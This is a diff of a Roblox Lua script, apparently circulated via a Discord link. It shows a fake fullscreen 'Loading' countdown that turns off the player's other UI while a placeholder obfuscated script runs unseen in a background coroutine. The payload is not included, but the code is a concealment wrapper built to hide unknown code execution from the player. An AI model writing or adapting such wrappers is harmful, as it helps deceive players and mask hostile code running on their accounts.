@@ -1,61 +1,61 @@
+-- Fullscreen loading screen + background execution
 local player = game.Players.LocalPlayer
 local countdownTime = 140
 
--- Create loading screen GUI
-local loadingScreen = Instance.new("ScreenGui")
-loadingScreen.Name = "LoadingScreen"
-loadingScreen.Parent = player.PlayerGui
+-- Create a fullscreen black GUI
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LOADING_HIDE"
+loadingGui.ResetOnSpawn = false
+loadingGui.IgnoreGuiInset = true
+loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+loadingGui.Parent = player:WaitForChild("PlayerGui")
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-frame.BackgroundTransparency = 0.5
-frame.Parent = loadingScreen
+local bg = Instance.new("Frame")
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.Parent = loadingGui
 
-local textLabel = Instance.new("TextLabel")
-textLabel.Size = UDim2.new(0, 400, 0, 50)
-textLabel.Position = UDim2.new(0.5, -200, 0.5, -25)
-textLabel.Text = "Loading: " .. countdownTime
-textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-textLabel.TextScaled = true
-textLabel.BackgroundTransparency = 1
-textLabel.Parent = frame
+local label = Instance.new("TextLabel")
+label.Text = "Loading: " .. countdownTime
+label.Font = Enum.Font.SourceSansBold
+label.TextSize = 48
+label.TextColor3 = Color3.new(1, 1, 1)
+label.BackgroundTransparency = 1
+label.AnchorPoint = Vector2.new(0.5, 0.5)
+label.Position = UDim2.new(0.5, 0, 0.5, 0)
+label.Size = UDim2.new(0, 400, 0, 100)
+label.Parent = bg
 
--- Function to disable player UI and inventory
-local function disableUI()
-    for _, gui in pairs(player.PlayerGui:GetChildren()) do
-        if gui:IsA("ScreenGui") and gui.Name ~= "LoadingScreen" then
-            gui.Enabled = false
-        end
+-- Disable all other UI
+for _, gui in pairs(player.PlayerGui:GetChildren()) do
+    if gui:IsA("ScreenGui") and gui.Name ~= "LOADING_HIDE" then
+        gui.Enabled = false
     end
 end
 
--- Function to execute your obfuscated script
-local function executeScript()
-    -- Insert your obfuscated script execution code here
-    -- This is where you want your obfuscated script to run in the background
-    -- Example of your obfuscated code:
-    local _0xA1 = ...
-    _0xA1:execute()  -- This part will execute your obfuscated code
+-- Run your script in background
+coroutine.wrap(function()
+    -- INSERT YOUR OBFUSCATED SCRIPT BELOW THIS LINE
+    local _0xABC = ...
+    _0xABC:execute()
+    -- INSERT ABOVE THIS LINE
+end)()
+
+-- Countdown display
+for i = countdownTime, 1, -1 do
+    label.Text = "Loading: " .. i
+    wait(1)
 end
 
--- Countdown Timer
-local function countdown()
-    -- Execute the script as soon as the countdown starts (in the background)
-    executeScript()
-
-    for i = countdownTime, 1, -1 do
-        textLabel.Text = "Loading: " .. i
-        wait(1)
+-- Restore UI
+loadingGui:Destroy()
+for _, gui in pairs(player.PlayerGui:GetChildren()) do
+    if gui:IsA("ScreenGui") then
+        gui.Enabled = true
     end
-
-    -- After countdown is finished, remove the loading screen
-    loadingScreen:Destroy()
 end
-
--- Disable player UI and start the countdown
-disableUI()
-countdown()
 --[[
 
 discord.gg/25ms
